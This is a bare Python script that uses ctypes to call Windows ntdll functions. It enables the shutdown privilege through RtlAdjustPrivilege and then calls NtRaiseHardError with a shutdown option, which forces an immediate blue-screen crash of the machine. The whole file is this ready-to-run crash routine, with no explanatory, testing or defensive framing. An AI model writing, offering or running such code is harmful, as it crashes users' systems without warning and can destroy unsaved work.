from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref

nullptr = POINTER(c_int)()

windll.ntdll.RtlAdjustPrivilege(
    c_uint(19),
    c_uint(1),
    c_uint(0),
    byref(c_int())
)

windll.ntdll.NtRaiseHardError(
    c_ulong(0xC000007B),
    c_ulong(0),
    nullptr,
    nullptr,
    c_uint(6),
    byref(c_uint())
)
